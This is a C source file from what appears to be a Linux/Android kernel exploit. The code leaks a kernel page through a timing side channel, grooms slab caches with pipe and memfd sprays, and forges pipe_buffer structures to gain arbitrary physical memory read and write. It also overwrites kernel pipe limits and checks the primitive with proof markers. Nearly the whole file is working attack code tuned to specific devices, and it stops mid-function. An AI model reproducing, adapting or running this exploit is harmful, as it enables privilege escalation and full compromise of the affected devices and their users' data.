#include "common.h"
#include "fd_budget.h"

#define PIPE_SHAPE_ROUNDS 0
/*
 * The order-3 leak that hands us the pipe_buffer page rides on a KernelSnitch
 * timing side channel.  Measured on this device: every historical successful run
 * got it on the FIRST try, but in the current device state it needs 5-17 tries
 * (see the "KernelSnitch bruteforce mm=ffffffffffffffff" lines).  Without a
 * retry the child still reports `(-1) & ~(ORDER3_SIZE-1)`, an address nothing
 * maps, and shape_pipe_cache()/forge_pipe_buffers_on_page() then write there and
 * panic.  Retry with a fresh child instead, mirroring
 * prepare_good_kernel_page() (util.c), which already retries this leak.
 */
#ifndef PIPE_PAGE_SETUP_ATTEMPTS
#define PIPE_PAGE_SETUP_ATTEMPTS 24
#endif
#define PHYSRW_PROOF_OFF 0x7000
#define PHYS_READ_TAG "nebusec_70687973727730"
#define PHYS_WRITE_TAG "nebusec_70687973727731"
#define PHYS64_SEED 0x306365737562656eULL
#define PHYS64_NEXT 0x316365737562656eULL

static int pipe_objects_ready;
static int pipe_fds_n[PIPE_N_COUNT][2];
static int pipe_fds_c[PIPE_C_COUNT][2];
static int pipe_fds_e[PIPE_E_COUNT][2];
static int pipe_fds_drain[PIPE_DRAIN][2];
static int pipe_fds_reclaim[PIPE_RECLAIM][2];

pid_t pipe_prepare_child = -1;
uint64_t kmalloc_pipe_cache;
uint64_t kmalloc_normal_1k_cache;
uint64_t kmalloc_normal_2k_cache;
uint64_t kmalloc_cgroup_1k_cache;
uint64_t kmalloc_cgroup_2k_cache;
uint64_t candidate_slab_cache;
int pipe_cache_gate_ok;
int pipe_cache_page_index = -1;
int pipe_cache_slot_hit = -1;
uint64_t pipe_page_slab_cache[PIPE_CANDIDATE_PAGES];
uint32_t pipe_page_type[PIPE_CANDIDATE_PAGES];
uintptr_t pipebuf_page_base;
uintptr_t pipebuf_addr;
int pipebuf_pipe_idx = -1;
char physrw_readback[64];
char physrw_after_write[64];
int physrw_read_ok;
int physrw_write_ok;
int pipe_scan_vmemmap;
int pipe_scan_ops;
int pipe_scan_len;
int pipe_probe_found;
uint64_t pipe_probe_page;
uint64_t pipe_probe_ops;
uint64_t pipe_probe_private;
uint32_t pipe_probe_len;
uint32_t pipe_probe_flags;
uint64_t pipe_scan_first_page;
uint64_t pipe_scan_first_ops;
uint64_t pipe_scan_q0;
uint64_t pipe_scan_q1;
uint64_t pipe_scan_q2;
uint64_t pipe_scan_q3;
uint32_t pipe_scan_first_len;
uint32_t pipe_scan_first_flags;
uint64_t physrw_read64_before;
uint64_t physrw_read64_after;
uint64_t physrw_write64_value;
int physrw_read64_ok;
int physrw_write64_ok;

void init_ctx(struct mm_ctx *ctx, size_t cnt) {
  ctx->mm_cnt = cnt;
  ctx->childs = calloc(sizeof(pid_t), cnt);
  ctx->memfds = calloc(sizeof(int), cnt);
}

void resize_pipe_slots(int pipefd[2], size_t slots) {
  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
}

void make_pipe_object(int pipefd[2]) {
  SYSCHK(pipe(pipefd));
  resize_pipe_slots(pipefd, 2);
}

void alloc_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
}

void free_pipe_object(int pipefd[2]) {
  resize_pipe_slots(pipefd, 2);
}

void shape_pipe_cache_once(void) {
  for (size_t i = 0; i < PIPE_N_COUNT; i++) {
    alloc_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i++) {
    alloc_pipe_object(pipe_fds_c[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    alloc_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_N_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_n[i]);
  }
  for (size_t i = 0; i < PIPE_E_COUNT; i++) {
    free_pipe_object(pipe_fds_e[i]);
  }
  for (size_t i = 0; i < PIPE_C_COUNT; i += PIPE_OBJS_PER_SLAB) {
    free_pipe_object(pipe_fds_c[i]);
  }
}

void shape_pipe_cache(void) {
  for (int round = 0; round < PIPE_SHAPE_ROUNDS; round++) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      free_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      free_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      free_pipe_object(pipe_fds_e[i]);
    }
    shape_pipe_cache_once();
  }
}

#ifdef PSELECT_WAITER_LAYOUT_5_10
static int read_planted_line(uintptr_t *out) {
  char line[128];
  if (!fgets(line, sizeof(line), stdin)) {
    return 0;
  }
  char *p = line;
  while (*p == ' ' || *p == '\t') {
    p++;
  }
  uintptr_t planted = (uintptr_t)strtoull(p, NULL, 0);
  if (!planted) {
    planted = (uintptr_t)strtoull(p, NULL, 16);
  }
  if (!planted) {
    return 0;
  }
  *out = planted & ~(ORDER3_SIZE - 1);
  return 1;
}
#endif

uintptr_t prepare_pipe_buffer_page_child(void) {
  struct mm_ctx prep;
  struct mm_ctx spray;
  struct mm_ctx pre;
  struct mm_ctx post;
  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;

  init_ctx(&prep, 32 * objs_per_slab);
  init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
  init_ctx(&pre, objs_per_slab - 1);
  init_ctx(&post, objs_per_slab);

  for (size_t i = 0; i < prep.mm_cnt; i++) {
    prep.childs[i] = -1;
    prep.memfds[i] = clone_memfd();
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    spray.childs[i] = -1;
    spray.memfds[i] = clone_memfd();
  }

  setup_kernelsnitch();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    pre.childs[i] = -1;
    pre.memfds[i] = clone_memfd();
  }
  pid_t leak_child = clone_leak_child();
  for (size_t i = 0; i < post.mm_cnt; i++) {
    post.childs[i] = -1;
    post.memfds[i] = clone_memfd();
  }
  int leak_memfd = open_memfd(leak_child);

  for (size_t i = 0; i < pre.mm_cnt; i++) {
    kill_child(pre.childs[i]);
  }
  for (size_t i = 0; i < post.mm_cnt; i++) {
    kill_child(post.childs[i]);
  }
  for (size_t i = 0; i < spray.mm_cnt; i++) {
    kill_child(spray.childs[i]);
  }
  SYSCHK(waitpid(leak_child, NULL, 0));

  if (!kernelsnitch_collisions_ready()) {
    pr_error("pipe KernelSnitch collision finding failed\n");
  }

  unsigned char *buf = malloc(SKB_SEND_SIZE);
  memset(buf, 0x50, SKB_SEND_SIZE);

  int skb_sv[2];
  int pcp_sv[2];
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv));
  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv));

  struct iovec iov;
  memset(&iov, 0, sizeof(iov));
  iov.iov_base = buf;
  iov.iov_len = SKB_SEND_SIZE;

  struct msghdr msg;
  memset(&msg, 0, sizeof(msg));
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
  pin_to_core(CORE);

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  for (size_t i = 0; i < pre.mm_cnt; i++) {
    SYSCHK(close(pre.memfds[i]));
  }
  for (size_t i = 0; i < post.mm_cnt - 1; i++) {
    SYSCHK(close(post.memfds[i]));
  }
  for (size_t i = 0; i < spray.mm_cnt; i += objs_per_slab) {
    SYSCHK(close(spray.memfds[i]));
  }
  SYSCHK(close(pcp_sv[0]));
  SYSCHK(close(pcp_sv[1]));

  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
#ifdef PSELECT_WAITER_LAYOUT_5_10
  /* Same 5.10 SLUB drain as prepare_kernel_page / S22U pipe prep:
   * freeze > cpu_partial extra partials so close(leak) discard_slab's
   * the order-3 page onto buddy before the skb frag takes it. */
  {
#ifndef MM_CPU_PARTIAL
#define MM_CPU_PARTIAL 13
#endif
    int froze = 0;
    for (size_t i = 0; i < prep.mm_cnt && froze < MM_CPU_PARTIAL + 4;
         i += objs_per_slab) {
      if (prep.memfds[i] >= 0) {
        SYSCHK(close(prep.memfds[i]));
        prep.memfds[i] = -1;
        froze++;
      }
    }
    pr_info("pipe prep cpu_partial freeze=%d objs_per_slab=%zu\n",
            froze, objs_per_slab);
  }
#endif
  SYSCHK(close(leak_memfd));
  SYSCHK(sendmsg(skb_sv[0], &msg, 0));

  run_kernelsnitch_bruteforce();
  uintptr_t leaked = cleanup_kernelsnitch();
  if (leaked == (uintptr_t)-1) {
    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
  }
  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
#ifdef PSELECT_WAITER_LAYOUT_5_10
  if (getenv("FOPS_WAIT_PLANTED") && getenv("FOPS_WAIT_PLANTED")[0] != '0') {
    pr_info("PIPE_WAIT_PLANTED leaked_base=%016zx; send planted direct page\n",
            base);
    uintptr_t planted = 0;
    if (read_planted_line(&planted)) {
      pr_info("pipe planted page from stdin=%016zx leaked_base=%016zx\n",
              planted, base);
      base = planted;
    }
  }
#endif

  shape_pipe_cache();

  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    alloc_pipe_object(pipe_fds_drain[i]);
  }

  pin_to_core(CORE);
  SYSCHK(close(skb_sv[0]));
  SYSCHK(close(skb_sv[1]));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    alloc_pipe_object(pipe_fds_reclaim[i]);
  }

  free(buf);
  return base;
}

uintptr_t prepare_pipe_buffer_page(void) {
  if (PIPE_SHAPE_ROUNDS != 0) {
    for (size_t i = 0; i < PIPE_N_COUNT; i++) {
      make_pipe_object(pipe_fds_n[i]);
    }
    for (size_t i = 0; i < PIPE_C_COUNT; i++) {
      make_pipe_object(pipe_fds_c[i]);
    }
    for (size_t i = 0; i < PIPE_E_COUNT; i++) {
      make_pipe_object(pipe_fds_e[i]);
    }
  }
  pr_info("phys step first pipe begin drain=%d reclaim=%d\n",
          PIPE_DRAIN, PIPE_RECLAIM);
  for (size_t i = 0; i < PIPE_DRAIN; i++) {
    make_pipe_object(pipe_fds_drain[i]);
  }
  pr_info("phys step first pipe ok fd0=%d fd1=%d\n",
          pipe_fds_drain[0][0], pipe_fds_drain[0][1]);
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    make_pipe_object(pipe_fds_reclaim[i]);
  }
  pipe_objects_ready = 1;

  /*
   * Fork a fresh child per attempt until one reports a plausible order-3 page.
   * The child consumes kernel state (memfds, skb, slab drain) and parks itself in
   * a sleep loop; killing it releases all of that, so a retry starts clean.
   */
  for (int attempt = 1; attempt <= PIPE_PAGE_SETUP_ATTEMPTS; attempt++) {
    int result_pipe[2];
    SYSCHK(pipe(result_pipe));
    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(close(result_pipe[0]));
      uintptr_t child_base = prepare_pipe_buffer_page_child();
      SYSCHK(write(result_pipe[1], &child_base, sizeof(child_base)));
      for (;;) {
        sleep(60);
      }
    }

    pipe_prepare_child = child;
    SYSCHK(close(result_pipe[1]));
    uintptr_t base = 0;
    ssize_t got = read(result_pipe[0], &base, sizeof(base));
    SYSCHK(close(result_pipe[0]));
    if (got != (ssize_t)sizeof(base)) {
      pr_error("pipe page child did not report base\n");
      base = 0;
    }
    base &= ~(ORDER3_SIZE - 1);
    /* A real leak is an mm_struct in the direct map, so its order-3 base is a
     * direct-map address.  (-1) & ~mask is not, which is exactly how a failed
     * leak shows up. */
    if (base != 0 && (base & (ORDER3_SIZE - 1)) == 0 && is_direct_ptr(base)) {
      return base;
    }
    pr_warning("pipe page leak retry %d/%d base=%016zx\n", attempt,
               PIPE_PAGE_SETUP_ATTEMPTS, base);
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }
  pr_error("pipe page leak failed after %d attempts\n",
           PIPE_PAGE_SETUP_ATTEMPTS);
  return 0;
}

void reset_pipe_attempt(void) {
  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }

  if (pipe_objects_ready) {
    for (size_t i = 0; i < PIPE_DRAIN; i++) {
      close(pipe_fds_drain[i][0]);
      close(pipe_fds_drain[i][1]);
    }
    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
      close(pipe_fds_reclaim[i][0]);
      close(pipe_fds_reclaim[i][1]);
    }
    pipe_objects_ready = 0;
  }

  pipebuf_page_base = 0;
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_cache_gate_ok = 0;
  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  candidate_slab_cache = 0;
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
}

#ifdef PSELECT_WAITER_LAYOUT_5_10
static uintptr_t physrw_linear(uintptr_t addr) {
  if (addr >= KIMAGE_TEXT_BASE &&
      addr < KIMAGE_TEXT_BASE + 0x008000000000ULL) {
    return p0_data_alias(addr);
  }
  return addr;
}
#endif

uintptr_t direct_to_page(uintptr_t addr) {
#ifdef PSELECT_WAITER_LAYOUT_5_10
  /*
   * copy_page_to_iter: va = 0xffffffc008000000 + (page << 6).
   * Invert: pfn = (linear - PAGE_OFFSET) >> 12.  Do not add
   * memstart_addr — that is __va, not the pipe copy wrap.
   */
  uintptr_t linear = physrw_linear(addr);
  return qemu_wrap_linear_to_page(linear);
#elif defined(TARGET_PAGE_DIRECT_BASE)
  uintptr_t pfn = (addr - TARGET_PAGE_DIRECT_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
#else
  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
  return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
#endif
}

uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
  uintptr_t page = direct_to_page(addr);
  uintptr_t head_addr = page + STRUCT_PAGE_COMPOUND_HEAD_OFF;
  uint64_t compound_head = kernel_read64(fd, head_addr);
  if (compound_head & 1) {
    return compound_head & ~1ULL;
  }
  return page;
}

uintptr_t page_to_direct(uintptr_t page) {
#ifdef PSELECT_WAITER_LAYOUT_5_10
  return page_struct_to_direct(page);
#else
  uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
#ifdef TARGET_PAGE_DIRECT_BASE
  return TARGET_PAGE_DIRECT_BASE + (pfn << PAGE_SHIFT);
#else
  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
#endif
#endif
}

uintptr_t pipe_buf_ops_addr(void) {
  return text_addr(ANON_PIPE_BUF_OPS);
}

int pipe_cache_matches(uint64_t slab_cache) {
  if (slab_cache == 0) {
    return 0;
  }
  if (KMALLOC_PIPE_INDEX == 10) {
    return slab_cache == kmalloc_normal_1k_cache ||
           slab_cache == kmalloc_cgroup_1k_cache;
  }
  if (KMALLOC_PIPE_INDEX == 11) {
    return slab_cache == kmalloc_normal_2k_cache ||
           slab_cache == kmalloc_cgroup_2k_cache;
  }
  return slab_cache == kmalloc_pipe_cache;
}

int pipe_reclaim_cache_gate(int fd) {
#ifdef PSELECT_WAITER_LAYOUT_5_10
  /* Official path: skip kmalloc_caches kimage read (HARDENED_USERCOPY
   * "linear kernel text").  The second KernelSnitch reclaim already
   * placed pipe_inode_info onto a planted linear page. */
  (void)fd;
  if (!pipebuf_page_base) {
    return 0;
  }
  pipe_cache_gate_ok = 1;
  return 1;
#else
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 0;
  }

  pipe_cache_page_index = -1;
  pipe_cache_slot_hit = -1;
  memset(pipe_page_slab_cache, 0, sizeof(pipe_page_slab_cache));
  memset(pipe_page_type, 0, sizeof(pipe_page_type));

  uint64_t cache_slots[KMALLOC_CACHE_SLOTS];
  memset(cache_slots, 0, sizeof(cache_slots));
  uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
  kernel_read_data(fd, kmalloc_caches, cache_slots, sizeof(cache_slots));
  kmalloc_normal_1k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_normal_2k_cache =
    cache_slots[KMALLOC_NORMAL_TYPE * KMALLOC_BUCKETS + 11];
  kmalloc_cgroup_1k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 10];
  kmalloc_cgroup_2k_cache =
    cache_slots[KMALLOC_CGROUP_TYPE * KMALLOC_BUCKETS + 11];

  kmalloc_pipe_cache =
    kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
    uintptr_t page = pipebuf_page_base + off;
    uintptr_t head = direct_to_head_page(fd, page);
    uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
    uintptr_t type_addr = head + STRUCT_PAGE_TYPE_OFF;
    uint32_t page_type = (uint32_t)kernel_read64(fd, type_addr);
    pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
    pipe_page_type[off / PAGE_SIZE] = page_type;
    int cache_match = pipe_cache_matches(slab_cache);
    if (off == 0 || cache_match) {
      candidate_slab_cache = slab_cache;
    }
    for (int slot = 0; slot < KMALLOC_CACHE_SLOTS; slot++) {
      if (cache_slots[slot] == slab_cache) {
        pipe_cache_slot_hit = slot;
      }
    }
    if (cache_match) {
      pipebuf_page_base = page;
      pipe_cache_page_index = off / PAGE_SIZE;
      pipe_cache_gate_ok = 1;
      return 1;
    }
  }

  pipe_cache_gate_ok = 0;
  return 0;
#endif
}

int read_pipe_slab(int fd, uintptr_t base, unsigned char *slab) {
#ifdef PSELECT_WAITER_LAYOUT_5_10
  uintptr_t page = direct_to_page(base);
  uint64_t flags = kernel_read64(fd, page);
  uint64_t slab_cache = kernel_read64(fd, page + STRUCT_SLAB_CACHE_OFF);
  uint32_t page_type = (uint32_t)kernel_read64(fd, page + STRUCT_PAGE_TYPE_OFF);
  pr_info("phys step scan page=%016zx flags=%016llx cache=%016llx type=%08x "
          "chunk=%d\n",
          page, (unsigned long long)flags, (unsigned long long)slab_cache,
          page_type, PIPE_SCAN_CHUNK);
  /* This vmlinux: __check_object_size tests flags bit 10 (PG_slab). */
  if ((flags & (1ULL << 10)) || page_type == PAGE_TYPE_SLAB) {
    pr_info("phys step skip PageSlab scan base=%016zx\n", base);
    return 0;
  }
#endif
  for (size_t off = 0; off < ORDER3_SIZE; off += PIPE_SCAN_CHUNK) {
    if (kernel_read_data(fd, base + off, slab + off, PIPE_SCAN_CHUNK) !=
        PIPE_SCAN_CHUNK) {
      return 0;
    }
  }
  return 1;
}



int find_pipe_buffer(int fd, uintptr_t base) {
  unsigned char slab[ORDER3_SIZE];
  pipebuf_addr = 0;
  pipebuf_pipe_idx = -1;
  pipe_probe_found = 0;
  pipe_probe_page = 0;
  pipe_probe_ops = 0;
  pipe_probe_private = 0;
  pipe_probe_len = 0;
  pipe_probe_flags = 0;
  pipe_scan_vmemmap = 0;
  pipe_scan_ops = 0;
  pipe_scan_len = 0;
  pipe_scan_first_page = 0;
  pipe_scan_first_ops = 0;
  pipe_scan_first_len = 0;
  pipe_scan_first_flags = 0;
  pipe_scan_q0 = 0;
  pipe_scan_q1 = 0;
  pipe_scan_q2 = 0;
  pipe_scan_q3 = 0;
  if (!read_pipe_slab(fd, base, slab)) {
    return 0;
  }
  memcpy(&pipe_scan_q0, slab + 0x00, 8);
  memcpy(&pipe_scan_q1, slab + 0x08, 8);
  memcpy(&pipe_scan_q2, slab + 0x10, 8);
  memcpy(&pipe_scan_q3, slab + 0x18, 8);

  for (size_t off = 0; off + sizeof(struct user_pipe_buffer) <= ORDER3_SIZE;
       off += 8) {
    struct user_pipe_buffer pb;
    memcpy(&pb, slab + off, sizeof(pb));
    if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
      pipe_scan_vmemmap++;
      if (pipe_scan_first_page == 0) {
        pipe_scan_first_page = pb.page;
        pipe_scan_first_ops = pb.ops;
        pipe_scan_first_len = pb.len;
        pipe_scan_first_flags = pb.flags;
      }
    } else {
      continue;
    }
    if (pb.ops == pipe_buf_ops_addr()) {
      pipe_scan_ops++;
    }
    if (pb.len > 0 && pb.len <= PIPE_RECLAIM) {
      pipe_scan_len++;
    }
    if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
      continue;
    }
    if (pb.len == 0 || pb.len > PIPE_RECLAIM) {
      continue;
    }

    pipebuf_addr = base + off;
    pipebuf_pipe_idx = (int)pb.len - 1;
    pipe_probe_found = 1;
    pipe_probe_page = pb.page;
    pipe_probe_ops = pb.ops;
    pipe_probe_private = pb.private;
    pipe_probe_len = pb.len;
    pipe_probe_flags = pb.flags;
    return 1;
  }

  return 0;
}

int pipe_phys_read(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    void *out, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

#ifdef PSELECT_WAITER_LAYOUT_5_10
  int fl = fcntl(pipefd[0], F_GETFL, 0);
  if (fl >= 0) {
    fcntl(pipefd[0], F_SETFL, fl | O_NONBLOCK);
  }
#endif
  ssize_t got = read(pipefd[0], out, len);
  int ok = got == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

int pipe_phys_write(
    int fd, int pipefd[2], uintptr_t buf_addr, uintptr_t direct_addr,
    const void *data, size_t len) {
  struct user_pipe_buffer saved;
  if (kernel_read_data(fd, buf_addr, &saved, sizeof(saved)) !=
      (ssize_t)sizeof(saved)) {
    return 0;
  }

  struct user_pipe_buffer pb = saved;
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = 0;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
  pb.private = 0;

  if (kernel_write_data(fd, buf_addr, &pb, sizeof(pb)) !=
      (ssize_t)sizeof(pb)) {
    return 0;
  }

#ifdef PSELECT_WAITER_LAYOUT_5_10
  int fl = fcntl(pipefd[1], F_GETFL, 0);
  if (fl >= 0) {
    fcntl(pipefd[1], F_SETFL, fl | O_NONBLOCK);
  }
#endif
  ssize_t wrote = write(pipefd[1], data, len);
  int ok = wrote == (ssize_t)len;
  kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
  return ok;
}

void forge_pipe_buffers_on_page(
    int fd, uintptr_t base, uintptr_t direct_addr, size_t len, int for_write) {
  struct user_pipe_buffer pb;
  memset(&pb, 0, sizeof(pb));
  pb.page = direct_to_page(direct_addr);
  pb.offset = direct_addr & (PAGE_SIZE - 1);
  pb.len = for_write ? 0 : len + 1;
  pb.ops = pipe_buf_ops_addr();
  pb.flags = PIPE_BUF_FLAG_CAN_MERGE;

  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
    kernel_write_data(fd, base + off, &pb, sizeof(pb));
  }
}

int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_read(fd, pipefd, pipebuf_addr, direct_addr, out, len);
  } else {
#ifdef PSELECT_WAITER_LAYOUT_5_10
    /* Forging pipe_buffer onto the CFI overlay page makes the next
     * write_bin vfree that dest.  Only a scanned bufs slot is safe. */
    (void)fd;
    (void)direct_addr;
    (void)out;
    (void)len;
    return 0;
#else
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 0);
    ssize_t got = read(pipe_fds_reclaim[pipebuf_pipe_idx][0], out, len);
    return got == (ssize_t)len;
#endif
  }
}

int pipe_phys_write_data(
    int fd, uintptr_t direct_addr, const void *data, size_t len) {
  if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
    return 0;
  }
  if (!is_direct_ptr(direct_addr) ||
      (direct_addr & (PAGE_SIZE - 1)) + len > PAGE_SIZE) {
    return 0;
  }

  if (pipebuf_addr) {
    int *pipefd = pipe_fds_reclaim[pipebuf_pipe_idx];
    return pipe_phys_write(fd, pipefd, pipebuf_addr, direct_addr, data, len);
  } else {
#ifdef PSELECT_WAITER_LAYOUT_5_10
    (void)fd;
    (void)direct_addr;
    (void)data;
    (void)len;
    return 0;
#else
    forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 1);
    ssize_t wrote = write(pipe_fds_reclaim[pipebuf_pipe_idx][1], data, len);
    return wrote == (ssize_t)len;
#endif
  }
}

uint64_t pipe_read64(int fd, uintptr_t direct_addr) {
  uint64_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

uint32_t pipe_read32(int fd, uintptr_t direct_addr) {
  uint32_t value = 0;
  pipe_phys_read_data(fd, direct_addr, &value, sizeof(value));
  return value;
}

int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
  return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
}

int install_pipe_physrw(int fd) {
#ifdef PSELECT_WAITER_LAYOUT_5_10
  /* kmalloc caches stop at 8K; ring*0x28 for 512 slots is 20K and
   * comes from the order-3 buddy.  Non-root FSETPIPE_SZ also hits
   * pipe_user_pages_soft, so raise both via the proven CFI write. */
  uint32_t max_size = (uint32_t)(PIPE_BUFFER_SLOTS * PAGE_SIZE);
  uint64_t soft_pages = 0x100000ULL;
  ssize_t max_wr = kernel_write_data(
      fd, text_addr(PIPE_MAX_SIZE), &max_size, sizeof(max_size));
  ssize_t soft_wr = kernel_write_data(
      fd, text_addr(PIPE_USER_PAGES_SOFT), &soft_pages, sizeof(soft_pages));
  pr_info("phys step pipe_max_size ret=%zd want=%u soft ret=%zd\n",
          max_wr, max_size, soft_wr);
  stop_punch_for_pipe();
  /* Planted overlay skbs stay queued; drop absorb sockets and leftover
   * spray memfds so the first pipe() is not EMFILE. */
  release_absorb_sockets();
  if (!ensure_pipe_fd_budget()) {
    pr_error("phys step fd budget short for pipe-physrw\n");
    return 0;
  }
#endif
  if (pipebuf_page_base == 0) {
    atomic_store(&pipe_prepare_done, 0);
    atomic_store(&pipe_prepare_request, 1);
    while (!atomic_load(&pipe_prepare_done)) {
      usleep(10000);
    }
  }
  if (pipebuf_page_base == 0) {
    /* The worker gave up on the order-3 leak.  Using 0 (or the leaked -1) as a
     * page base would make every later forge write into unmapped memory, so bail
     * out with a plain failure instead of panicking. */
    pr_error("phys step pipe page leak unavailable\n");
    return 0;
  }

  uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
  uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
  if (proof_page != (proof_addr & ~(PAGE_SIZE - 1))) {
    return 0;
  }
  if (!pipe_reclaim_cache_gate(fd)) {
    pr_info("phys step cache gate failed slab=%016zx want=%016zx\n",
            candidate_slab_cache, kmalloc_pipe_cache);
    return 0;
  }

  char marker[PIPE_RECLAIM];
  memset(marker, 0x61, sizeof(marker));
  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
    SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
  }

  int found = find_pipe_buffer(fd, pipebuf_page_base);
  pr_info("phys step pipe probe found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d "
          "first_ops=%016llx want_ops=%016zx q0=%016llx q1=%016llx\n",
          found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
          pipe_scan_ops, pipe_scan_len,
          (unsigned long long)pipe_scan_first_ops,
          (size_t)pipe_buf_ops_addr(),
          (unsigned long long)pipe_scan_q0,
          (unsigned long long)pipe_scan_q1);
  if (!found) {
    return 0;
  }
  if (!pipe_cache_gate_ok) {
    pipe_cache_gate_ok = 2;
  }

  char seed[] = PHYS_READ_TAG;
  if (kernel_write_data(fd, proof_addr, seed, sizeof(seed)) !=
      (ssize_t)sizeof(seed)) {
    return 0;
  }

  memset(physrw_readback, 0, sizeof(physrw_readback));
  physrw_read_ok =
    pipe_phys_read_data(fd, proof_addr, physrw_readback, sizeof(seed));
  pr_info("phys step probed read done ok=%d idx=%d page=%016zx "
          "proof=%016zx cmp=%d\n",
          physrw_read_ok, pipebuf_pipe_idx, direct_to_page(proof_addr),
          proof_addr,
          memcmp(physrw_readback, seed, sizeof(seed)) == 0);

  char overwrite[] = PHYS_WRITE_TAG;
  physrw_write_ok =
    pipe_phys_write_data(fd, proof_addr, overwrite, sizeof(overwrite));
  pr_info("phys step probed write done ok=%d\n", physrw_write_ok);
#ifdef PSELECT_WAITER_LAYOUT_5_10
  pipe_phys_read_data(fd, proof_addr, physrw_after_write, sizeof(overwrite));
#else
